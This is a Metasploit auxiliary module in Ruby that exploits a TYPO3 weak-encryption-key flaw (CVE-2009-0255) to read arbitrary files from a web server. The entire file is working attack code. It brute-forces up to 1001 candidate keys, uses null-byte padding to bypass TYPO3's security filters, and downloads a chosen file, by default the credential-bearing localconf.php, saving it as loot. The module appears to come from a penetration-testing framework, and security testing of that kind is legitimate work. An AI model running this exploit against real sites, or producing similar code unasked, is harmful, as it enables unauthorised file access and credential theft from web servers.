##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'TYPO3 sa-2009-001 Weak Encryption Key File Disclosure',
      'Description' => %q{
        This module exploits a flaw in TYPO3 encryption ey creation process to allow for
        file disclosure in the jumpUrl mechanism. This flaw can be used to read any file
        that the web server user account has access to view.
      },
      'References' => [
        ['CVE', '2009-0255'],
        ['OSVDB', '51536'],
        ['URL', 'http://blog.c22.cc/advisories/typo3-sa-2009-001'],
        ['URL', 'http://typo3.org/teams/security/security-bulletins/typo3-sa-2009-001/'],
      ],
      'DisclosureDate' => 'Jan 20 2009',
      'Author' => [ 'Chris John Riley' ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'Reliability' => []
      }
    )

    register_options(
      [
        OptString.new('URI', [true, 'TYPO3 Path', '/']),
        OptString.new('RFILE', [true, 'The remote file to download', 'typo3conf/localconf.php']),
        OptString.new('ENC_KEY', [false, 'Encryption key if known', '']),
      ]
    )
  end

  def enc_key(seed)
    if datastore['ENC_KEY'] != ''
      final = datastore['ENC_KEY']
      print_status('Using provided Encryption Key')
    else
      # build the encryption key to check
      seed = seed.to_s
      rnd1 = Digest::MD5.hexdigest(seed)
      rnd2 = Digest::MD5.hexdigest(rnd1)
      rnd3 = Digest::MD5.hexdigest(rnd1 + rnd2)
      final = rnd1 + rnd2 + rnd3
    end

    return final
  end

  def run
    # Add padding to bypass TYPO3 security filters
    #
    # Null byte fixed in PHP 5.3.4
    #

    uri = normalize_uri(datastore['URI'])
    case datastore['RFILE']
    when nil
      # Nothing
    when /localconf\.php$/i
      jumpurl = "#{datastore['RFILE']}%00/."
      jumpurl_len = jumpurl.length - 2 # Account for difference in length with null byte
      jumpurl_enc = jumpurl.sub('%00', "\00") # Replace %00 with \00 to correct null byte format
      print_status("Adding padding to end of #{datastore['RFILE']} to avoid TYPO3 security filters")
    when %r{^\.\.(/|\\)}i
      print_error('Directory traversal detected... you might want to start that with a /.. or \\..')
    else
      jumpurl_len = datastore['RFILE'].length
      jumpurl = datastore['RFILE'].to_s
      jumpurl_enc = datastore['RFILE'].to_s
    end

    print_status("Establishing a connection to #{rhost}:#{rport}")
    print_status("Trying to retrieve #{datastore['RFILE']}")
    print_status('Rotating through possible weak encryption keys')

    success = false
    for i in (0..1000)

      final = enc_key(i)

      location_data = Rex::Text.rand_text_numeric(1) + '::' + Rex::Text.rand_text_numeric(2)
      juarray = "a:3:{i:0;s:#{jumpurl_len}:\"#{jumpurl_enc}\""
      juarray << ";i:1;s:#{location_data.length}:\"#{location_data}\""
      juarray << ";i:2;s:#{final.length}:\"#{final}\";}"

      juhash = Digest::MD5.hexdigest(juarray)
      juhash = juhash[0..9] # shortMD5 value for use as juhash

      uri_base_path = normalize_uri(uri, '/index.php')

      file_uri = "#{uri_base_path}?jumpurl=#{jumpurl}&juSecure=1&locationData=#{location_data}&juHash=#{juhash}"
      vprint_status("Checking Encryption Key [#{i}/1000]: #{final}")

      begin
        file = send_request_raw({
          'uri' => file_uri,
          'method' => 'GET',
          'headers' =>
          {
            'Connection' => 'Close'
          }
        }, 25)
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
        vprint_error(e.message)
      rescue ::Timeout::Error, ::Errno::EPIPE => e
        print_error(e.message)
      end

      case file.headers['Content-Type']
      when 'text/html'
        case file.body
        when 'jumpurl Secure: "' + datastore['RFILE'] + '" was not a valid file!'
          print_error("File #{datastore['RFILE']} does not exist.")
          print_good("Discovered encryption key : #{final}")
          break
        when 'jumpurl Secure: locationData, ' + location_data + ', was not accessible.'
          print_error("File #{datastore['RFILE']} is not accessible.")
          print_good("Discovered encryption key : #{final}")
          break
        when 'jumpurl Secure: The requested file was not allowed to be accessed through jumpUrl (path or file not allowed)!'
          print_error("File #{datastore['RFILE']} is not allowed to be accessed through jumpUrl.")
          print_good("Discovered encryption key : #{final}")
          break
        end
      when 'application/octet-stream'
        success = true
        addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB
        print_good("Discovered encryption key : #{final}")
        print_good('Writing local file ' + File.basename(datastore['RFILE'].downcase) + ' to loot')
        store_loot('typo3_' + File.basename(datastore['RFILE'].downcase), 'text/xml', addr, file.body, 'typo3_' + File.basename(datastore['RFILE'].downcase), 'Typo3_sa_2009_001')
        break
      else
        if datastore['ENC_KEY'] != ''
          print_error('Encryption Key specified is not correct')
          break
        end
      end
    end

    print_error("#{rhost}:#{rport} [Typo3-SA-2009-001] Failed to retrieve file #{datastore['RFILE']}") unless success
  end
end
